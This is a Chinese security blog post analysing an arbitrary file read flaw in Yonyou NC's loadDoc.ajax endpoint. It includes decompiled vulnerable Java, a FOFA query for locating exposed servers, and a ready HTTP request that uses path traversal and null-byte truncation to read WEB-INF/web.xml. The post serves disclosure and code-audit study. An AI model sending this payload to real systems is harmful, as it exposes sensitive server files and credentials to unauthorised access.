---
title: "用友NC loadDoc.ajax 文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html
asset_dir: assets/用友nc-loaddoc.ajax-文件读取漏洞
---

# 用友NC loadDoc.ajax 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/6 08:27
* 1202浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

部署

企业资源计划

云平台


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC loadDoc 接口处 ws 参数存在[文件读取](https://mrxn.net/tag/文件读取)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `LoadDocAction.java` 里有关 `LoadDocAction` 的实现逻辑

```
package nc.uap.ws.console.action;

import java.io.IOException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.uap.ws.console.action.IAction;
import nc.uap.ws.console.config.Config;
import nc.uap.ws.console.fault.Fault;
import nc.uap.ws.console.fault.Faults;
import nc.uap.ws.console.helper.DocHelper;

public class LoadDocAction
implements IAction {
    @Override
    public Faults execuse(HttpServletRequest req, HttpServletResponse resp) {
        Faults faults = new Faults();
        String ws = req.getParameter("ws");
        if (ws == null || ws.equals("")) {
            faults.add(new Fault(0, "ws param need to be setted"));
            return faults;
        }
        DocHelper manager = new DocHelper(Config.docDir);
        try {
            String doc = manager.loadDoc(ws);
            resp.setStatus(200);
            resp.getWriter().write(doc);
        }
        catch (IOException e) {
            faults.add(new Fault(80, e.getMessage()));
            return faults;
        }
        return faults;
    }
}
```

深入探索

在线安全工具

编码转换工具

JSON处理工具

可以看到 获取 `ws` 参数，直接带入 `loadDoc` 方法，跟进看其实现

企业资源规划

```
package nc.uap.ws.console.helper;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

public class DocHelper {
    private String DocDir;

    public DocHelper(String DocDir) {
        this.DocDir = DocDir;
    }

    public String loadDoc(String ws) throws IOException {
        StringBuilder builder = new StringBuilder();
        BufferedReader br = null;
        try {
            String line;
            File file = new File(new File(this.DocDir), ws + ".txt");
            if (!file.exists()) {
                file.createNewFile();
            }
            FileReader fr = new FileReader(file);
            br = new BufferedReader(fr);
            while ((line = br.readLine()) != null) {
                builder.append(line);
            }
        }
        catch (IOException e) {
            throw e;
        }
        finally {
            if (br != null) {
                br.close();
                br = null;
            }
        }
        return builder.toString();
    }
```

用户可控的 `ws` 参数直接拼接文件路径，未对输入进行合法性校验，如果后端java版本低于7，就通过%00截断绕过 txt 后缀限制，从而达到任意文件读取的目的。

云存储

关于 Java 中 %00 (NULL byte) 截断漏洞的版本信息如下:

受影响的 Java 版本范围:

* Java 7 以下所有版本(Java SE 7 之前)
* Java 6 所有版本(包括 Java SE 6 所有更新版本)
* Java 5 所有版本
* Java 1.4 及更早版本

不受影响的 Java 版本:

* Java 7 及以上版本(Java SE 7+)已修复了这个问题

其实这个漏洞和之前已经披露的 `saveDoc` 任意文件上传漏洞都在同一个文件里，只不过最近才披露这个 `loadDoc` 任意[文件读取漏洞](https://mrxn.net/tag/文件读取)罢了。

[![用友NC loadDoc.ajax 文件读取漏洞](images/img-001-3155e5b0e695.webp)](https://image.mrxn.net/8fa47036b88f452797b044cc88743631.webp)

# 漏洞复现

```
POST /uapws/loadDoc.ajax HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

ws=../../WEB-INF/web.xml%00
```

成功读取到 `web.xml` 文件

[![用友NC loadDoc.ajax 文件读取漏洞](images/img-002-e268bc5ebc06.webp)](https://image.mrxn.net/7196f91cb57646d2be678799ad780cb7.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC loadDoc.ajax 文件读取漏洞](https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

开发工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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